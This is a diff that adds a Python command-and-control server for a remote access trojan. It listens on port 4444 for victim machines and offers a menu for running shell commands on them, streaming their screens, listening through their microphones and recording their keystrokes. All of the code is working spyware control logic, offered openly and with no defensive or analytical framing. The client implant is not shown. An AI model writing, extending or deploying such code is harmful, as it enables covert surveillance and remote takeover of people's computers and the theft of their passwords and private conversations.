@@ -1,0 +1,350 @@
+import socket
+from threading import Thread
+import time
+import struct
+import os
+import random
+from PIL import ImageGrab
+from PIL import Image
+import numpy as np
+import io
+import zlib
+import cv2
+import pyaudio
+
+class SERVER:
+    
+    def __init__(self, ip, port):
+        self.ip = ip
+        self.port = port
+        self.address = (self.ip, self.port)
+        self.is_server_running = False
+        self.receive_screenshot_trigger = False
+        self.audiospy_trigger = False
+        self.keyboard_recording_trigger = False
+        self.clients = {}
+        self.threads_tracker = {}
+        self.BUFFER = 4096
+        self.client_counter = 0
+        
+    def log(self, msg):
+        print(f'\nSERVER ALERT: {str(msg)}\n')
+    
+    def remove_client(self, client_socket):
+        for key, value in self.clients.items():
+            if value[1] == client_socket:
+                client_socket.close()
+                del self.clients[key]
+                self.log(f'{key} Has Been Removed')
+    
+    def remove_AllClients(self):
+        all_clients = self.get_AllClients()
+        for client in all_clients:
+            del self.clients[client]
+    
+    def stop_all(self):
+        self.receive_screenshot_trigger = False
+        self.audiospy_trigger = False
+        self.is_server_running = False
+        self.server_Socket.close()
+        self.remove_AllClients()
+        self.kill_threads()
+    
+    def get_clientAddr(self, client_socket):
+        for key, value in self.clients.items():
+            if value[1] == client_socket:
+                return key
+
+    def thread_starter(self, name, func, params: tuple=None, daemon: bool=False):
+        if name in self.threads_tracker:
+            self.log(f'{name}: Thread is already running')
+            return False
+        
+        if params:
+            thread_obj = Thread(target=func, name=name, args=params, daemon=daemon)
+        else:
+            thread_obj = Thread(target=func, name=name, daemon=daemon)
+            
+        thread_obj.start()
+
+        self.threads_tracker[name] = thread_obj
+        self.log(f'[{name.upper()}] Thread is Started')
+    
+    def get_AllThreads(self):
+        return [i for i in self.threads_tracker]
+    
+    def get_AllClients(self):
+        return [i for i in self.clients]
+
+    def kill_threads(self):
+        if len(self.threads_tracker) > 0:
+            all_keys = self.get_AllThreads()
+            for key in all_keys:
+                del self.threads_tracker[key]    
+                time.sleep(0.1)
+            self.log('All Threads Cleaned')
+
+    def check_clients_nmuber(self):
+        if len(self.clients) > 0:
+            return True
+        else:
+            return False
+        
+    def display_clients(self):
+        if len(self.clients) > 0:
+            for i, c in enumerate(self.clients, start=1):
+                print(f'{i}) {c[0]}:{c[1]}')
+
+    def helper(self):
+        os.system('cls')
+        return """
+    1) Send And Receive CMD Commands
+    2) Start Live Screen Streaming
+    3) Spy On Microphone
+    4) Keyboard Strokes Recorder
+    """
+    
+    def data_unpacker(self, data) -> int:
+        return struct.unpack('Q', data)[0]
+    
+    def getHostName(self, client_socket) -> str:
+        client_socket.send('GETHOSTNAME'.encode())
+        hostname = client_socket.recv(self.BUFFER)
+        return hostname.decode()
+    
+    def getClientSocketByIndex(self, index) -> tuple:
+        clients_key = list(self.clients)[index]
+        return self.clients[clients_key]
+    
+    def send_cmd(self, client_socket, command) -> tuple:
+        xcommand = 'CMD_COMMAND_' + command
+        client_socket.send(xcommand.encode('utf-8'))
+        size_ = self.data_unpacker(client_socket.recv(self.BUFFER))
+        data = client_socket.recv(size_)
+        return (data, size_)
+    
+    def connect(self, client_index):
+            self.client_handler(self.getClientSocketByIndex(client_index)[1])
+    
+    def receive_screenshot(self, client_socket):
+        if self.receive_screenshot_trigger:
+            udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            udps.bind(self.address)
+            client_socket.send(b'SCRSHOOT')
+            while self.receive_screenshot_trigger:
+                try:
+                    size = self.data_unpacker(udps.recvfrom(8)[0])
+                    image_buffer = io.BytesIO()
+                    while len(image_buffer.getvalue()) < size:
+                        imdata = udps.recvfrom(size)[0]
+                        image_buffer.write(imdata)
+                    try:
+                        decompress_imdata = zlib.decompress(image_buffer.getvalue())
+                    except zlib.error:
+                        continue
+                    npimg = np.frombuffer(decompress_imdata, dtype=np.uint8)
+                    decode_img = cv2.imdecode(npimg, cv2.IMREAD_COLOR)
+                    colored_image = cv2.cvtColor(decode_img, cv2.COLOR_BGR2RGB)
+                    cv2.imshow('STREAM 30 FPS', colored_image)
+                    cv2.waitKeyEx(1)
+                except KeyboardInterrupt:
+                    self.receive_screenshot_trigger = False
+                    client_socket.send(b'STOP_SCRSHOOT')
+                    cv2.destroyAllWindows()
+                    udps.close()
+                except Exception as e:
+                    print(e)
+                    continue
+        else:
+            self.log('Failed To Init Screen Streaming')
+            
+    def spyAudio(self, client_socket):
+        client_socket.send(b'AUDIO_SPY')
+        udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        udps.bind(self.address)
+        paudio = pyaudio.PyAudio()
+        audio_stream = paudio.open(channels=2, rate=44100, format=pyaudio.paInt16, output=True)
+        def stopAudioSpy():
+            self.audiospy_trigger = False
+            audio_stream.stop_stream()
+            audio_stream.close()
+            paudio.terminate()
+            client_socket.send(b'CLOSE_AUDIO_SPY')
+            udps.close()
+        while self.audiospy_trigger:
+            try:
+                audio_stream.write(udps.recvfrom(self.BUFFER)[0])
+            except KeyboardInterrupt:
+                stopAudioSpy()
+                break
+            except Exception as e:
+                self.log(f'Error: {e}')
+                stopAudioSpy()
+                input()
+                break
+
+    def keyboard_record(self, client_socket):
+        os.system('cls')
+        client_socket.send(b'KEY_REC')
+        self.log('KEYBOARD LOGGER STARTED, TO ELIMINATE THIS PROCESS PRESS CTR+C.')
+        full_word = ''
+        while self.keyboard_recording_trigger:
+            try:
+                data = client_socket.recv(self.BUFFER).decode().strip("'")
+                if not data:
+                    break
+                if '⌫' in data:
+                    full_word = full_word[:-1]
+                elif '\n' in data:
+                    print('\n')
+                    full_word = ''
+                else:
+                    full_word += data
+                print(full_word, end='\r', flush=True)
+            except KeyboardInterrupt:
+                break
+            
+        client_socket.send(b'STOP_KEY_REC')
+        self.keyboard_recording_trigger = False
+            
+    def validate_string(self, text):
+        if len(text) == 0:
+            return False
+        elif text == '':
+            return False
+        elif text == ' ':
+            return False
+        elif text.isspace():
+            return False
+        return True
+        
+    def client_handler(self, client_socket):
+        while self.is_server_running:
+            try:
+                print(self.helper())
+                client_address = self.get_clientAddr(client_socket)
+                comm = int(input('>> '))
+                if not comm:
+                    continue
+                if comm == 1:
+                    os.system('cls')
+                    cliHostName = self.getHostName(client_socket)
+                    while True:
+                        xcommand = input(f'{cliHostName}@ROOT>')
+                        if not self.validate_string(xcommand):
+                            continue
+                        if xcommand == 'b' or xcommand == 'B':
+                            break
+                        elif xcommand in ('cls', 'clear'):
+                            os.system('cls')
+                            continue
+                        data, size = self.send_cmd(client_socket, xcommand)
+                        self.log(f'Received {size} Bytes OF Data From {client_address}:\n{data.decode()}')
+                elif comm == 2:
+                    self.receive_screenshot_trigger = True
+                    self.receive_screenshot(client_socket)
+                
+                elif comm == 3:
+                    self.audiospy_trigger = True
+                    self.spyAudio(client_socket)
+                
+                elif comm == 4:
+                    self.keyboard_recording_trigger = True
+                    self.keyboard_record(client_socket)
+            except TypeError:
+                continue
+            except Exception as err:
+                self.log(f'Error with {client_address}: {err}')
+                # self.remove_client(client_socket)
+                input()
+                return False
+            
+    def start_server(self):
+        if not self.is_server_running:
+            try:
+                self.server_Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.server_Socket.bind(self.address)
+                self.server_Socket.listen()
+                self.is_server_running = True
+                self.log(f'Server is now running on {self.address}')
+                while self.is_server_running:
+                    try:
+                        conn, addr = self.server_Socket.accept()
+                        self.log(f'{addr[0]} Connected')
+                        self.clients[addr] = (self.client_counter, conn)
+                        self.client_counter += 1
+                    except OSError:
+                        self.server_Socket.close()
+            except (ConnectionError, ConnectionResetError, ConnectionRefusedError) as err:
+                print(f'Connection Error: {err}')
+                self.is_server_running = False
+                self.stop_server()
+        else:
+            self.log('Server Already Running')
+
+    def stop_server(self):
+        try:
+            if self.is_server_running:
+                self.stop_all()
+                self.log('Server Has Been Stopped')
+            else:
+                self.log('Server Isn\'t Running')
+        except Exception as e:
+            self.server_Socket.close()
+            self.log(f'Server Has Been Stopped Due To an Error: {e}')
+                        
+    def root(self):
+        while True:
+            os.system('cls')
+            try:
+                n = int(input('''1) Start Server\n2) Stop Server\n3) Show Clients\n4) Connect To Client\n5) Remove Client\n\n\t>> '''))
+                if n == 1:
+                    self.thread_starter('server', self.start_server)
+                    input('')
+                elif n == 2:
+                    self.stop_server()
+                    input('')
+                elif n == 3:
+                    os.system('cls')
+                    if self.check_clients_nmuber():
+                        self.display_clients()
+                        input()
+                    else:
+                        self.log('No Clients Were Found.')
+                        input()
+                elif n == 4:
+                    os.system('cls')
+                    try:
+                        if self.check_clients_nmuber():
+                            self.display_clients()
+                            client_index = int(input('\nEnter Client Number >> ')) - 1
+                            if client_index < 0:
+                                continue
+                            self.connect(client_index)
+                        else:
+                            self.log('No Clients Were Found.')
+                            input()
+                    except ValueError:
+                        continue
+                elif n == 5:
+                    os.system('cls')
+                    try:
+                        if self.check_clients_nmuber():
+                            self.display_clients()
+                            client_index = int(input('\nEnter Client Number >> ')) - 1
+                            client_socket_ = self.getClientSocketByIndex(client_index)[1]
+                            os.system('cls')
+                            self.remove_client(client_socket_)
+                            input()
+                        else:
+                            self.log('No Clients Were Found.')
+                            input()
+                    except:
+                        input()
+                        continue
+            except:
+                continue
+
+if __name__ == '__main__':
+    server = SERVER('127.0.0.1', 4444)
+    server.root()
